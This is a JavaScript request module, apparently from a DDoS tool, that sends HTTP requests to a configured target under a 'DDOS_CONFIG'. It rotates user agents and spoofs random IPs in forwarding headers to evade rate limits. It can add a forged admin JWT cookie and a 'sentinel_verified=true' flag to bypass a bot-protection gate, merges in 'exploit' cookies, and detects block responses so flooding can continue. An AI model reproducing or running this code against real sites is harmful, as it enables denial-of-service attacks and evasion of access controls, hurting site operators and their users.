const axios = require('axios');
const http = require('http');
const https = require('https');
const { TARGET_URL, DDOS_CONFIG, TIMEOUT_MS, USER_AGENTS } = require('./config');

const agentOptions = { 
    keepAlive: DDOS_CONFIG.USE_KEEP_ALIVE, 
    maxSockets: DDOS_CONFIG.CONCURRENT * 2 
};

const httpAgent = new http.Agent(agentOptions);
const httpsAgent = new https.Agent({ 
    ...agentOptions, 
    rejectUnauthorized: !DDOS_CONFIG.IGNORE_SSL 
});

let cookieJar = '';

function randomHeader(options = {}) {
    const { addBadCookie = false, forceRotateUA = false, exploitCookie = '' } = options;
    
    const headers = {
        'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
    };

    if (forceRotateUA) {
        // Generate random IP
        const randomIP = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
        headers['X-Forwarded-For'] = randomIP;
        headers['X-Real-IP'] = randomIP;
        headers['Client-IP'] = randomIP;
    }

    // Combine cookies
    let finalCookie = cookieJar;
    if (addBadCookie) {
        finalCookie = (finalCookie ? finalCookie + '; ' : '') + 'sb-access-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.invalid_signature; sentinel_verified=true';
    }
    if (exploitCookie) {
        finalCookie = (finalCookie ? finalCookie + '; ' : '') + exploitCookie;
    }

    if (finalCookie) {
        headers['Cookie'] = finalCookie;
    }

    return headers;
}

async function sendRequest(url, method, data = null, headers = {}, options = {}) {
    const startReq = Date.now();
    try {
        const config = {
            url: TARGET_URL + url,
            method,
            timeout: TIMEOUT_MS,
            headers: { ...randomHeader(options), ...headers },
            httpAgent, 
            httpsAgent,
            validateStatus: () => true,
        };
        
        if (data) {
            config.data = data;
            config.headers['Content-Type'] = 'application/json';
        }

        const res = await axios(config);
        const latency = Date.now() - startReq;

        const responseDataStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data || '');
        const isSentinelBlocked = res.status === 429 || res.status === 403 || res.status === 503 ||
            (responseDataStr.includes('Sentinel') && responseDataStr.includes('Gatekeeper') && responseDataStr.includes('browser'));

        if (isSentinelBlocked) {
            return { status: 'BLOCKED', code: res.status, latency, data: res.data };
        } else if (res.status >= 200 && res.status < 400) {
            const setCookie = res.headers['set-cookie'];
            if (setCookie && setCookie.length) {
                // Merging instead of replacing to keep exploit cookies alive
                const newCookies = setCookie.map(c => c.split(';')[0]).join('; ');
                cookieJar = (cookieJar ? cookieJar + '; ' : '') + newCookies;
            }
            return { status: 'SUCCESS', code: res.status, data: res.data, data_headers: res.headers, latency };
        } else {
            return { status: 'FAILED', code: res.status, latency, data: res.data, data_headers: res.headers };
        }
    } catch (err) {
        return { status: 'ERROR', code: err.message, latency: Date.now() - startReq };
    }
}

module.exports = {
    sendRequest,
    randomHeader,
    getCookieJar: () => cookieJar,
    resetCookieJar: () => { cookieJar = ''; }
};
